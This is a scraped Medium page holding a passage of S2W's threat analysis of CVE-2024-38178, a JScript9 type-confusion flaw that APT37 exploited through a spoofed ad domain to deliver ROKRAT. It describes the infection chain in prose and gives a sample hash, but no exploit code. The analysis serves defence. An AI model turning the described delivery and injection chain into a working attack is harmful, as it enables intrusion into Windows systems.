3290473","logo":{"@type":"ImageObject","url":"https:\u002F\u002Fcdn-images-1.medium.com\u002Fmax\u002F980\u002F1*9ygdqoKprhwuTVKUM0DLPA@2x.png","width":980,"height":159}}},"3f6ecf56618":{"name":"Forge","data":{"@type":"NewsMediaOrganization","ethicsPolicy":"https:\u002F\u002Fhelp.medium.com\u002Fhc\u002Fen-us\u002Farticles\u002F360043290473","logo":{"@type":"ImageObject","url":"https:\u002F\u002Fcdn-images-1.medium.com\u002Fmax\u002F596\u002F1*uULpIlImcO5TDuBZ6lm7Lg@2x.png","width":596,"height":183}}},"ae2a65f35510":{"name":"GEN","data":{"@type":"NewsMediaOrganization","ethicsPolicy":"https:\u002F\u002Fhelp.medium.com\u002Fhc\u002Fen-us\u002Farticles\u002F360043290473","logo":{"@type":"ImageObject","url":"https:\u002F\u002Fmiro.medium.com\u002Fmax\u002F264\u002F1*RdVZMdvfV3YiZTw6mX7yWA.png","width":264,"height":140}}},"88d9857e584e":{"name":"LEVEL","data":{"@type":"NewsMediaOrganization","ethicsPolicy":"https:\u002F\u002Fhelp.medium.com\u002Fhc\u002Fen-us\u002Farticles\u002F360043290473","logo":{"@type":"ImageObject","url":"https:\u002F\u002Fmiro.medium.com\u002Fmax\u002F540\u002F1*JqYMhNX6KNNb2UlqGqO2WQ.png","width":540,"height":108}}},"7b6769f2748b":{"name":"Marker","data":{"@type":"NewsMediaOrganization","ethicsPolicy":"https:\u002F\u002Fhelp.medium.com\u002Fhc\u002Fen-us\u002Farticles\u002F360043290473","logo":{"@type":"ImageObject","url":"https:\u002F\u002Fcdn-images-1.medium.com\u002Fmax\u002F383\u002F1*haCUs0wF6TgOOvfoY-jEoQ@2x.png","width":383,"height":92}}},"444d13b52878":{"name":"OneZero","data":{"@type":"NewsMediaOrganization","ethicsPolicy":"https:\u002F\u002Fhelp.medium.com\u002Fhc\u002Fen-us\u002Farticles\u002F360043290473","logo":{"@type":"ImageObject","url":"https:\u002F\u002Fmiro.medium.com\u002Fmax\u002F540\u002F1*cw32fIqCbRWzwJaoQw6BUg.png","width":540,"height":123}}},"8ccfed20cbb2":{"name":"Zora","data":{"@type":"NewsMediaOrganization","ethicsPolicy":"https:\u002F\u002Fhelp.medium.com\u002Fhc\u002Fen-us\u002Farticles\u002F360043290473","logo":{"@type":"ImageObject","url":"https:\u002F\u002Fmiro.medium.com\u002Fmax\u002F540\u002F1*tZUQqRcCCZDXjjiZ4bDvgQ.png","width":540,"height":106}}}},"embeddedPostIds":{"coronavirus":"cd3010f9d81f"},"sharedCdcMessaging":{"COVID_APPLICABLE_TAG_SLUGS":[],"COVID_APPLICABLE_TOPIC_NAMES":[],"COVID_APPLICABLE_TOPIC_NAMES_FOR_TOPIC_PAGE":[],"COVID_MESSAGES":{"tierA":{"text":"For more information on the novel coronavirus and Covid-19, visit cdc.gov.","markups":[{"start":66,"end":73,"href":"https:\u002F\u002Fwww.cdc.gov\u002Fcoronavirus\u002F2019-nCoV"}]},"tierB":{"text":"Anyone can publish on Medium per our Policies, but we don’t fact-check every story. For more info about the coronavirus, see cdc.gov.","markups":[{"start":37,"end":45,"href":"https:\u002F\u002Fhelp.medium.com\u002Fhc\u002Fen-us\u002Fcategories\u002F201931128-Policies-Safety"},{"start":125,"end":132,"href":"https:\u002F\u002Fwww.cdc.gov\u002Fcoronavirus\u002F2019-nCoV"}]},"paywall":{"text":"This article has been made free for everyone, thanks to Medium Members. For more information on the novel coronavirus and Covid-19, visit cdc.gov.","markups":[{"start":56,"end":70,"href":"https:\u002F\u002Fmedium.com\u002Fmembership"},{"start":138,"end":145,"href":"https:\u002F\u002Fwww.cdc.gov\u002Fcoronavirus\u002F2019-nCoV"}]},"unbound":{"text":"This article is free for everyone, thanks to Medium Members. For more information on the novel coronavirus and Covid-19, visit cdc.gov.","markups":[{"start":45,"end":59,"href":"https:\u002F\u002Fmedium.com\u002Fmembership"},{"start":127,"end":134,"href":"https:\u002F\u002Fwww.cdc.gov\u002Fcoronavirus\u002F2019-nCoV"}]}},"COVID_BANNER_POST_ID_OVERRIDE_WHITELIST":["3b31a67bff4a"]},"sharedVoteMessaging":{"TAGS":["politics","election-2020","government","us-politics","election","2020-presidential-race","trump","donald-trump","democrats","republicans","congress","republican-party","democratic-party","biden","joe-biden","maga"],"TOPICS":["politics","election"],"MESSAGE":{"text":"Find out more about the U.S. election results here.","markups":[{"start":46,"end":50,"href":"https:\u002F\u002Fcookpolitical.com\u002F2020-national-popular-vote-tracker"}]},"EXCLUDE_POSTS":["397ef29e3ca5"]},"embedPostRules":[],"recircOptions":{"v1":{"limit":3},"v2":{"limit":8}},"braintreeClientKey":"production_zjkj96jm_m56f8fqpf7ngnrd4","braintree":{"enabled":true,"merchantId":"m56f8fqpf7ngnrd4","merchantAccountId":{"usd":"AMediumCorporation_instant","eur":"amediumcorporation_EUR","cad":"amediumcorporation_CAD"},"publicKey":"ds2nn34bg2z7j5gd","braintreeEnvironment":"production","dashboardUrl":"https:\u002F\u002Fwww.braintreegateway.com\u002Fmerchants","gracePeriodDurationInDays":14,"mediumMembershipPlanId":{"monthly":"ce105f8c57a3","monthlyV2":"e8a5e126-792b-4ee6-8fba-d574c1b02fc5","monthlyWithTrial":"d5ee3dbe3db8","monthlyPremium":"fa741a9b47a2","yearly":"a40ad4a43185","yearlyV2":"3815d7d6-b8ca-4224-9b8c-182f9047866e","yearlyStaff":"d74fb811198a","yearlyWithTrial":"b3bc7350e5c7","yearlyPremium":"e21bd2c12166","monthlyOneYearFree":"e6c0637a-2bad-4171-ab4f-3c268633d83c","monthly25PercentOffFirstYear":"235ecc62-0cdb-49ae-9378-726cd21c504b","monthly20PercentOffFirstYear":"ba518864-9c13-4a99-91ca-411bf0cac756","monthly15PercentOffFirstYear":"594c029b-9f89-43d5-88f8-8173af4e070e","monthly10PercentOffFirstYear":"c6c7bc9a-40f2-4b51-8126-e28511d5bdb0","monthlyForStudents":"629ebe51-da7d-41fd-8293-34cd2f2030a8","yearlyOneYearFree":"78ba7be9-0d9f-4ece-aa3e-b54b826f2bf1","yearly25PercentOffFirstYear":"2dbb010d-bb8f-4eeb-ad5c-a08509f42d34","yearly20PercentOffFirstYear":"47565488-435b-47f8-bf93-40d5fbe0ebc8","yearly15PercentOffFirstYear":"8259809b-0881-47d9-acf7-6c001c7f720f","yearly10PercentOffFirstYear":"9dd694fb-96e1-472c-8d9e-3c868d5c1506","yearlyForStudents":"e29345ef-ab1c-4234-95c5-70e50fe6bc23","monthlyCad":"p52orjkaceei","yearlyCad":"h4q9g2up9ktt"},"braintreeDiscountId":{"oneMonthFree":"MONTHS_FREE_01","threeMonthsFree":"MONTHS_FREE_03","sixMonthsFree":"MONTHS_FREE_06","fiftyPercentOffOneYear":"FIFTY_PERCENT_OFF_ONE_YEAR"},"3DSecureVersion":"2","defaultCurrency":"usd","providerPlanIdCurrency":{"4ycw":"usd","rz3b":"usd","3kqm":"usd","jzw6":"usd","c2q2":"usd","nnsw":"usd","q8qw":"usd","d9y6":"usd","fx7w":"cad","nwf2":"cad"}},"paypalClientId":"AXj1G4fotC2GE8KzWX9mSxCH1wmPE3nJglf4Z2ig_amnhvlMVX87otaq58niAg9iuLktVNF_1WCMnN7v","paypal":{"host":"https:\u002F\u002Fapi.paypal.com:443","clientMode":"production","serverMode":"live","webhookId":"4G466076A0294510S","monthlyPlan":{"planId":"P-9WR0658853113943TMU5FDQA","name":"Medium Membership (Monthly) with setup fee","description":"Unlimited access to the best and brightest stories on Medium. Membership billed monthly."},"yearlyPlan":{"planId":"P-7N8963881P8875835MU5JOPQ","name":"Medium Membership (Annual) with setup fee","description":"Unlimited access to the best and brightest stories on Medium. Membership billed annually."},"oneYearGift":{"name":"Medium Membership (1 Year, Digital Gift Code)","description":"Unlimited access to the best and brightest stories on Medium. Gift codes can be redeemed at medium.com\u002Fredeem.","price":"50.00","currency":"USD","sku":"membership-gift-1-yr"},"oldMonthlyPlan":{"planId":"P-96U02458LM656772MJZUVH2Y","name":"Medium Membership (Monthly)","description":"Unlimited access to the best and brightest stories on Medium. Membership billed monthly."},"oldYearlyPlan":{"planId":"P-59P80963JF186412JJZU3SMI","name":"Medium Membership (Annual)","description":"Unlimited access to the best and brightest stories on Medium. Membership billed annually."},"monthlyPlanWithTrial":{"planId":"P-66C21969LR178604GJPVKUKY","name":"Medium Membership (Monthly) with setup fee","description":"Unlimited access to the best and brightest stories on Medium. Membership billed monthly."},"yearlyPlanWithTrial":{"planId":"P-6XW32684EX226940VKCT2MFA","name":"Medium Membership (Annual) with setup fee","description":"Unlimited access to the best and brightest stories on Medium. Membership billed annually."},"oldMonthlyPlanNoSetupFee":{"planId":"P-4N046520HR188054PCJC7LJI","name":"Medium Membership (Monthly)","description":"Unlimited access to the best and brightest stories on Medium. Membership billed monthly."},"oldYearlyPlanNoSetupFee":{"planId":"P-7A4913502Y5181304CJEJMXQ","name":"Medium Membership (Annual)","description":"Unlimited access to the best and brightest stories on Medium. Membership billed annually."},"sdkUrl":"https:\u002F\u002Fwww.paypal.com\u002Fsdk\u002Fjs"},"stripePublishableKey":"pk_live_7FReX44VnNIInZwrIIx6ghjl","log":{"json":true,"level":"info"},"imageUploadMaxSizeMb":25,"staffPicks":{"title":"Staff Picks","catalogId":"c7bc6e1ee00f"}},"session":{"xsrf":""}}</script><script>window.__APOLLO_STATE__ = {"ROOT_QUERY":{"__typename":"Query","viewer":null,"collectionByDomainOrSlug({\"domainOrSlug\":\"s2wblog\"})":{"__ref":"Collection:30a8766b5c42"},"postResult({\"id\":\"91ad954dbf83\"})":{"__ref":"Post:91ad954dbf83"}},"ImageMetadata:":{"__typename":"ImageMetadata","id":""},"Collection:30a8766b5c42":{"__typename":"Collection","id":"30a8766b5c42","favicon":{"__ref":"ImageMetadata:"},"customStyleSheet":null,"colorPalette":{"__typename":"ColorPalette","highlightSpectrum":{"__typename":"ColorSpectrum","backgroundColor":"#FFFFFFFF","colorPoints":[{"__typename":"ColorPoint","color":"#FFFFFFFF","point":0},{"__typename":"ColorPoint","color":"#FFE8F3E8","point":0.1},{"__typename":"ColorPoint","color":"#FFE8F3E8","point":0.2},{"__typename":"ColorPoint","color":"#FFD1E7D1","point":0.6},{"__typename":"ColorPoint","color":"#FFA3D0A2","point":1}]},"defaultBackgroundSpectrum":{"__typename":"ColorSpectrum","backgroundColor":"#FFFFFFFF","colorPoints":[{"__typename":"ColorPoint","color":"#FF1A8917","point":0},{"__typename":"ColorPoint","color":"#FF11800E","point":0.1},{"__typename":"ColorPoint","color":"#FF0F730C","point":0.2},{"__typename":"ColorPoint","color":"#FF095407","point":1}]},"tintBackgroundSpectrum":null},"googleAnalyticsId":null,"editors":[{"__typename":"CollectionMastheadUserItem","user":{"__ref":"User:b408bb1e7c46"}},{"__typename":"CollectionMastheadUserItem","user":{"__ref":"User:2f530d0bd34e"}},{"__typename":"CollectionMastheadUserItem","user":{"__ref":"User:78cc13007a6d"}},{"__typename":"CollectionMastheadUserItem","user":{"__ref":"User:c109a5c416ae"}},{"__typename":"CollectionMastheadUserItem","user":{"__ref":"User:f4e82d165d60"}}],"name":"S2W BLOG","avatar":{"__ref":"ImageMetadata:1*3vCxewFUeWWkQ-O5X558rQ.jpeg"},"domain":null,"slug":"s2wblog","description":"S2W is a big data intelligence company specialized in the Dark Web, Deepweb and any other covert channels.","subscriberCount":214,"latestPostsConnection({\"paging\":{\"limit\":1}})":{"__typename":"PostConnection","posts":[{"__typename":"Post","title":"Unmasking CVE-2024-38178: The Silent Threat of Windows Scripting Engine","latestPublishedAt":1729080314998}]},"viewerEdge":{"__ref":"CollectionViewerEdge:collectionId:30a8766b5c42-viewerId:lo_335d62ef07dd"},"twitterUsername":"s2w_official","facebookPageId":null,"logo":{"__ref":"ImageMetadata:1*dAAOzI0wCWzr0K3RGg2Pzw.png"}},"User:b408bb1e7c46":{"__typename":"User","id":"b408bb1e7c46","name":"S2W","username":"s2w","newsletterV3":{"__ref":"NewsletterV3:132c6e8141c4"},"linkedAccounts":{"__ref":"LinkedAccounts:b408bb1e7c46"},"isSuspended":false,"imageId":"1*1DiWQYMzvUSAzrLJQX1z6g.png","mediumMemberAt":1638247509000,"verifications":{"__typename":"VerifiedInfo","isBookAuthor":false},"socialStats":{"__typename":"SocialStats","followerCount":645},"customDomainState":{"__typename":"CustomDomainState","live":{"__typename":"CustomDomain","domain":"s2w.medium.com"}},"hasSubdomain":true,"bio":"S2W is specializing in cybersecurity data analysis for cyber threat intelligence.","isPartnerProgramEnrolled":false,"viewerEdge":{"__ref":"UserViewerEdge:userId:b408bb1e7c46-viewerId:lo_335d62ef07dd"},"viewerIsUser":false,"postSubscribeMembershipUpsellShownAt":0,"userPostCounts({\"includeResponsesCount\":true})":null,"membership":{"__ref":"Membership:f9afb873cf43"},"allowNotes":true,"twitterScreenName":"S2W_Official"},"User:2f530d0bd34e":{"__typename":"User","id":"2f530d0bd34e"},"User:78cc13007a6d":{"__typename":"User","id":"78cc13007a6d"},"User:c109a5c416ae":{"__typename":"User","id":"c109a5c416ae"},"User:f4e82d165d60":{"__typename":"User","id":"f4e82d165d60"},"ImageMetadata:1*3vCxewFUeWWkQ-O5X558rQ.jpeg":{"__typename":"ImageMetadata","id":"1*3vCxewFUeWWkQ-O5X558rQ.jpeg"},"LinkedAccounts:b408bb1e7c46":{"__typename":"LinkedAccounts","mastodon":null,"id":"b408bb1e7c46"},"UserViewerEdge:userId:b408bb1e7c46-viewerId:lo_335d62ef07dd":{"__typename":"UserViewerEdge","id":"userId:b408bb1e7c46-viewerId:lo_335d62ef07dd","isFollowing":false,"isUser":false,"isMuting":false},"NewsletterV3:132c6e8141c4":{"__typename":"NewsletterV3","id":"132c6e8141c4","type":"NEWSLETTER_TYPE_AUTHOR","slug":"b408bb1e7c46","name":"b408bb1e7c46","collection":null,"user":{"__ref":"User:b408bb1e7c46"}},"Membership:f9afb873cf43":{"__typename":"Membership","tier":"MEMBER","id":"f9afb873cf43"},"Paragraph:c4f3422a977b_0":{"__typename":"Paragraph","id":"c4f3422a977b_0","name":"a743","type":"H3","href":null,"layout":null,"metadata":null,"text":"Unmasking CVE-2024-38178: The Silent Threat of Windows Scripting Engine","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:c4f3422a977b_1":{"__typename":"Paragraph","id":"c4f3422a977b_1","name":"af0a","type":"P","href":null,"layout":null,"metadata":null,"text":"Author: Hosu Choi, Minyeop Choi | S2W Talon","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"STRONG","start":0,"end":8,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:c4f3422a977b_2":{"__typename":"Paragraph","id":"c4f3422a977b_2","name":"680b","type":"BQ","href":null,"layout":null,"metadata":null,"text":"Last modified: Oct 16, 2024","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"STRONG","start":0,"end":13,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"EM","start":0,"end":27,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:c4f3422a977b_3":{"__typename":"Paragraph","id":"c4f3422a977b_3","name":"068e","type":"H3","href":null,"layout":null,"metadata":null,"text":"Executive Summary","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:c4f3422a977b_4":{"__typename":"Paragraph","id":"c4f3422a977b_4","name":"a5e7","type":"P","href":null,"layout":null,"metadata":null,"text":"(Vulnerability Overview) On August 13, 2024, Microsoft patched CVE-2024-38178, a vulnerability within JScript9.dll, as part of the August Patch Tuesday.","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"A","start":63,"end":77,"href":"https:\u002F\u002Fmsrc.microsoft.com\u002Fupdate-guide\u002Fvulnerability\u002FCVE-2024-38178","anchorType":"LINK","userId":null,"linkMetadata":null},{"__typename":"Markup","type":"STRONG","start":0,"end":25,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:c4f3422a977b_5":{"__typename":"Paragraph","id":"c4f3422a977b_5","name":"2f23","type":"P","href":null,"layout":null,"metadata":null,"text":"(Vulnerability Cause) CVE-2024-38178 is a type confusion vulnerability caused by the JIT engine in JScript9.dll performing incorrect optimizations on variables initialized with the usual arithmetic conversion exception operator, which can be used to bypass the CVE-2022-41128 patch released in November 2022.","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"STRONG","start":0,"end":22,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"STRONG","start":181,"end":208,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:c4f3422a977b_6":{"__typename":"Paragraph","id":"c4f3422a977b_6","name":"fbb2","type":"ULI","href":null,"layout":null,"metadata":null,"text":"CVE-2022-41128 is publicly available with detailed analysis and was exploited by a threat group behind North Korea in 2022, so it is likely that attackers quickly weaponized the vulnerability.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:c4f3422a977b_7":{"__typename":"Paragraph","id":"c4f3422a977b_7","name":"4430","type":"ULI","href":null,"layout":null,"metadata":null,"text":"An attacker exploiting this vulnerability can remotely execute code on a targeted Windows system.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:c4f3422a977b_8":{"__typename":"Paragraph","id":"c4f3422a977b_8","name":"2036","type":"P","href":null,"layout":null,"metadata":null,"text":"(Related threat groups and attacks) In June 2024, APT37 (Scarcruft), a North Korea-based threat group, exploited this vulnerability in an in-the-wild attack against specific organizations in South Korea.","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"STRONG","start":0,"end":35,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:c4f3422a977b_9":{"__typename":"Paragraph","id":"c4f3422a977b_9","name":"b7e5","type":"ULI","href":null,"layout":null,"metadata":null,"text":"(Related sample) 12721952796–107–0_1.ad_toast.html (MD5: e11bb2478930d0b5f6c473464f2a2b6e)","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"A","start":57,"end":89,"href":"https:\u002F\u002Fwww.virustotal.com\u002Fgui\u002Ffile\u002F736092b71a9686fde43d3c4abd941a6774721b90b17d946c9d05af19c84df0a4\u002Fdetection","anchorType":"LINK","userId":null,"linkMetadata":null},{"__typename":"Markup","type":"STRONG","start":0,"end":17,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:c4f3422a977b_10":{"__typename":"Paragraph","id":"c4f3422a977b_10","name":"93ac","type":"ULI","href":null,"layout":null,"metadata":null,"text":"(Distribution method) Malicious script downloaded from attacker’s C&C server* via freeware’s ad add-on feature process (*Uses a domain similar to a specific network advertising vendor name)","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"STRONG","start":0,"end":21,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:c4f3422a977b_11":{"__typename":"Paragraph","id":"c4f3422a977b_11","name":"cf37","type":"ULI","href":null,"layout":null,"metadata":null,"text":"(Behavior) After downloading the malicious script, the behavior is similar to previous attacks in 2021 via Ruby scripts. \n — [S2W] Matryoshka : Variant of ROKRAT, APT37 (ScarCruft)","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"A","start":125,"end":180,"href":"https:\u002F\u002Fmedium.com\u002Fs2wblog\u002Fmatryoshka-variant-of-rokrat-apt37-scarcruft-69774ea7bf48","anchorType":"LINK","userId":null,"linkMetadata":null},{"__typename":"Markup","type":"STRONG","start":0,"end":9,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"STRONG","start":106,"end":107,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"STRONG","start":122,"end":180,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:c4f3422a977b_12":{"__typename":"Paragraph","id":"c4f3422a977b_12","name":"e4bc","type":"ULI","href":null,"layout":null,"metadata":null,"text":"(Final malware) Finally identified as ROKRAT malware that communicates with cloud storage (Yandex, pCloud)","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"STRONG","start":0,"end":16,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:c4f3422a977b_13":{"__typename":"Paragraph","id":"c4f3422a977b_13","name":"6182","type":"P","href":null,"layout":null,"metadata":null,"text":"(Countermeasures) Vendors should pay special attention to versioning and vulnerability response for key modules used by legacy engines, as it is difficult for users to respond to exploits targeting software that uses outdated Windows libraries.","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"STRONG","start":0,"end":18,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:c4f3422a977b_14":{"__typename":"Paragraph","id":"c4f3422a977b_14","name":"c3d0","type":"H3","href":null,"layout":null,"metadata":null,"text":"Introduction","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:c4f3422a977b_15":{"__typename":"Paragraph","id":"c4f3422a977b_15","name":"79a0","type":"P","href":null,"layout":null,"metadata":null,"text":"On August 13, 2024, Microsoft patched CVE-2024-38178, a remote code execution vulnerability in JScript9.dll, as part of its August Patch Tuesday.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:c4f3422a977b_16":{"__typename":"Paragraph","id":"c4f3422a977b_16","name":"bc16","type":"P","href":null,"layout":null,"metadata":null,"text":"In June 2024, the vulnerability was exploited in an attack targeting products from a South Korean software vendor, and S2W obtained and analyzed a sample of the malware. After identifying the mechanism by which the targeted software executed JavaScript code embedded in the ad page in JScript9.dll*, the attacker used the vulnerability to trigger remote code execution and perform malicious actions on the victim’s Windows system.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:c4f3422a977b_17":{"__typename":"Paragraph","id":"c4f3422a977b_17","name":"4167","type":"P","href":null,"layout":null,"metadata":null,"text":"* See Appendix A. JScript9.dll Overview for an overview of the JScript9.dll scripting engine.","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"STRONG","start":6,"end":39,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:c4f3422a977b_18":{"__typename":"Paragraph","id":"c4f3422a977b_18","name":"8ed0","type":"P","href":null,"layout":null,"metadata":null,"text":"Sample analysis confirmed that CVE-2024-38178 is a type confusion vulnerability bypassing the existing CVE-2022-41128*patch.","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"STRONG","start":103,"end":118,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:c4f3422a977b_19":{"__typename":"Paragraph","id":"c4f3422a977b_19","name":"6651","type":"P","href":null,"layout":null,"metadata":null,"text":"* CVE-2022-41128 is a type confusion vulnerability in JScript9.dll that was used by the North Korea-based threat group APT37 in October 2022 in malware disguised as a document titled “Situation of the Itaewon Incident in Yongsan, Seoul”.","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"STRONG","start":0,"end":17,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"STRONG","start":19,"end":20,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:c4f3422a977b_20":{"__typename":"Paragraph","id":"c4f3422a977b_20","name":"20d4","type":"ULI","href":null,"layout":null,"metadata":null,"text":"Related malware analysis report: Internet Explorer 0-day exploited by North Korean actor APT37","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"A","start":33,"end":94,"href":"https:\u002F\u002Fblog.google\u002Fthreat-analysis-group\u002Finternet-explorer-0-day-exploited-by-north-korean-actor-apt37\u002F","anchorType":"LINK","userId":null,"linkMetadata":null},{"__typename":"Markup","type":"STRONG","start":33,"end":94,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:c4f3422a977b_21":{"__typename":"Paragraph","id":"c4f3422a977b_21","name":"efa0","type":"ULI","href":null,"layout":null,"metadata":null,"text":"Detailed analysis report of the vulnerability: CVE-2022-41128: Type confusion in Internet Explorer’s JScript9 engine","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"A","start":47,"end":116,"href":"https:\u002F\u002Fgoogleprojectzero.github.io\u002F0days-in-the-wild\u002F0day-RCAs\u002F2022\u002FCVE-2022-41128.html","anchorType":"LINK","userId":null,"linkMetadata":null},{"__typename":"Markup","type":"STRONG","start":47,"end":116,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:c4f3422a977b_22":{"__typename":"Paragraph","id":"c4f3422a977b_22","name":"6ff9","type":"H3","href":null,"layout":null,"metadata":null,"text":"Detailed Analysis","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:c4f3422a977b_23":{"__typename":"Paragraph","id":"c4f3422a977b_23","name":"1aa8","type":"H4","href":null,"layout":null,"metadata":null,"text":"1. In-The-Wild Vulnerability Exploitation Flow","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:c4f3422a977b_24":{"__typename":"Paragraph","id":"c4f3422a977b_24","name":"2626","type":"P","href":null,"layout":null,"metadata":null,"text":"The attacker is believed to have created a domain similar to that of a specific ad agency service provider and then approached the targeted software vendor to register a similar domain.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:c4f3422a977b_25":{"__typename":"Paragraph","id":"c4f3422a977b_25","name":"d286","type":"P","href":null,"layout":null,"metadata":null,"text":"The registered service is then rendered in the vendor's ad pop-up process of software. Typically, ad pages contain JavaScript to monitor events, such as the number of visits and ad pop-ups legacy WebView uses the JScript9 engine to execute JavaScript.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:c4f3422a977b_26":{"__typename":"Paragraph","id":"c4f3422a977b_26","name":"60df","type":"P","href":null,"layout":null,"metadata":null,"text":"The attacker targeted Windows users and injected an obfuscated JavaScript payload into the page the attacker constructed. Because the ad popup event typically occurs shortly after the victim launches the targeted software, the attacker was able to trigger a zero-day vulnerability in JScript9 (CVE-2024-38178) to perform malicious actions without further interaction.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"ImageMetadata:1*buHo6ydCb774gg64BFVRog.png":{"__typename":"ImageMetadata","id":"1*buHo6ydCb774gg64BFVRog.png","originalHeight":1426,"originalWidth":1650,"focusPercentX":null,"focusPercentY":null,"alt":null},"Paragraph:c4f3422a977b_27":{"__typename":"Paragraph","id":"c4f3422a977b_27","name":"0413","type":"IMG","href":null,"layout":"OUTSET_CENTER","metadata":{"__ref":"ImageMetadata:1*buHo6ydCb774gg64BFVRog.png"},"text":"Figure 1. Complete malware execution flow","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:c4f3422a977b_28":{"__typename":"Paragraph","id":"c4f3422a977b_28","name":"155c","type":"P","href":null,"layout":null,"metadata":null,"text":"The attacker exploited the vulnerability to execute arbitrary code, allowing them to configure the download of additional malware through multiple shares. The downloaded malware consists of a Ruby engine, a Ruby script, and an encrypted file decrypted by the Ruby script. The decrypted malware was executed by randomly selecting two executables in system32 and executing the injection in two stages by placing RokRAT in memory. The C2 of RokRAT used here was either Yandex or PCloud, consistent with the strategies, tactics, and procedures (TTPs) found in previous attacks by the APT37 attack group.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:c4f3422a977b_29":{"__typename":"Paragraph","id":"c4f3422a977b_29","name":"3395","type":"P","href":null,"layout":null,"metadata":null,"text":"Reference Report\u003E [S2W] Matryoshka : Variant of ROKRAT, APT37 